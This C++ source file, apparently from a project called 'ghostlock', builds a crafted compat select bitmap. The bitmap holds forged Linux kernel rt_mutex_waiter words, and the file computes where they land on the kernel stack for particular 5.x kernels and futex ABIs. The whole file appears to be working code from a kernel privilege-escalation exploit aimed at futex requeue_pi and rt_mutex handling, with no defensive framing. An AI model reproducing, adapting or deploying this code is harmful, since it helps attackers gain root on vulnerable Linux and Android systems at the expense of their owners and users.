#include "route/compat_bitmap.h"

#include <array>
#include <cstring>

using namespace ghostlock;

namespace ghostlock::route::compat {
    namespace {
        /* Address order of the 5.x rt_mutex_waiter strip. The helper never
         * interprets these; the kernel does. */
        std::array<uint64_t, kStripWords> strip_words(
            const memory::WaiterWords &words) noexcept {
            return {
                static_cast<uint64_t>(words.tree_pc),
                static_cast<uint64_t>(words.tree_right),
                static_cast<uint64_t>(words.tree_left),
                static_cast<uint64_t>(words.pi_pc),
                static_cast<uint64_t>(words.pi_right),
                static_cast<uint64_t>(words.pi_left),
                static_cast<uint64_t>(words.task),
                static_cast<uint64_t>(words.lock),
                words.prio,
                words.deadline,
                words.ww_ctx,
            };
        }

        void set_error(BitmapFitError *error, BitmapFitError value) noexcept {
            if (error != nullptr) *error = value;
        }
    } // namespace

    std::optional<::ghostlock::compat::CarrierFutexAbi> abi_for_waiter_home(
        uint32_t waiter_home) noexcept {
        switch (waiter_home) {
            case 0x1b0: /* futex_time32 (240) -> do_futex 0x80 -> futex_wait_requeue_pi 0xa0 */
                return ::ghostlock::compat::CarrierFutexAbi::Time32;
            case 0x1c0: /* __arm64_sys_futex (422) -> 0x90 / 0xb0 */
                return ::ghostlock::compat::CarrierFutexAbi::Time64;
            default:
                return std::nullopt;
        }
    }

    bool plan_compat_bitmap(BitmapGeometry geometry, BitmapPlan *plan,
                            BitmapFitError *error) noexcept {
        set_error(error, BitmapFitError::None);
        if (geometry.select_dst_depth < geometry.waiter_home) {
            /* The strip's home is deeper than the deepest user byte the kernel
             * copies: this is 5.10.236 (home 0x200/0x210 vs dst 0x1e0). The
             * depth reason is reported even when the home is also unheard of,
             * because that is the fact that scopes the carrier off 236. */
            set_error(error, BitmapFitError::HomeBelowDepth);
            return false;
        }
        const auto abi = abi_for_waiter_home(geometry.waiter_home);
        if (!abi) {
            set_error(error, BitmapFitError::UnknownHome);
            return false;
        }
        const uint32_t offset = geometry.select_dst_depth - geometry.waiter_home;
        BitmapPlan result{};
        result.futex_abi = *abi;
        result.offset = offset;

        if (*abi == ::ghostlock::compat::CarrierFutexAbi::Time64) {
            /* All eleven words must fit in the 0x78-byte user copy. */
            if (offset + kStripBytes > kBitmapBytes) {
                set_error(error, BitmapFitError::TooDeep);
                return false;
            }
            result.words = kFullUserWords;
            result.zero_tail = false;
        } else {
            /* Nine words user-copied; deadline/ww_ctx must be zero and must
             * land inside the kernel's zeroed res_* window:
             *   res_* spans depths [dst - 6*set, dst - 3*set]
             *   the tail spans   [home - 0x57, home - 0x48] */
            if (offset + kZeroTailWords * 8U > kBitmapBytes) {
                set_error(error, BitmapFitError::TooDeep);
                return false;
            }
            const int64_t set_bytes = static_cast<int64_t>(kBitmapSetBytes);
            const int64_t tail_deepest =
                static_cast<int64_t>(geometry.waiter_home) - 0x48;
            const int64_t tail_shallowest =
                static_cast<int64_t>(geometry.waiter_home) - 0x57;
            const int64_t zero_deepest =
                static_cast<int64_t>(geometry.select_dst_depth) - 6 * set_bytes;
            const int64_t zero_shallowest =
                static_cast<int64_t>(geometry.select_dst_depth) - 3 * set_bytes;
            if (tail_deepest > zero_shallowest || tail_shallowest < zero_deepest) {
                set_error(error, BitmapFitError::ZeroWindow);
                return false;
            }
            result.words = kZeroTailWords;
            result.zero_tail = true;
        }
        if (plan != nullptr) *plan = result;
        return true;
    }

    bool pack_compat_bitmap(
        const memory::WaiterWords &words, BitmapGeometry geometry,
        std::span<uint8_t> out, BitmapPlan *plan, BitmapFitError *error) noexcept {
        if (out.size() != kBitmapBytes) {
            set_error(error, BitmapFitError::BufferMismatch);
            return false;
        }
        BitmapPlan local_plan{};
        if (!plan_compat_bitmap(geometry, &local_plan, error)) {
            return false;
        }
        if (local_plan.zero_tail && (words.deadline != 0 || words.ww_ctx != 0)) {
            /* The zero tail is the reason time32 can use nine words; a
             * non-zero deadline/ww_ctx means the stamp relies on bytes the
             * user copy never delivers. */
            set_error(error, BitmapFitError::NonZeroTail);
            return false;
        }
        const std::array<uint64_t, kStripWords> strip = strip_words(words);
        std::memset(out.data(), 0, out.size());
        for (uint32_t word = 0; word < local_plan.words; word++) {
            const uint64_t value = strip[word];
            const size_t at = local_plan.offset + 8U * word;
            /* Little-endian on purpose: compat_get_bitmap pairs user words as
             * (l2 << 32) | l1, which is the same byte stream. */
            for (size_t byte = 0; byte < 8; byte++) {
                out[at + byte] = static_cast<uint8_t>(value >> (8U * byte));
            }
        }
        if (plan != nullptr) *plan = local_plan;
        set_error(error, BitmapFitError::None);
        return true;
    }
} // namespace ghostlock::route::compat
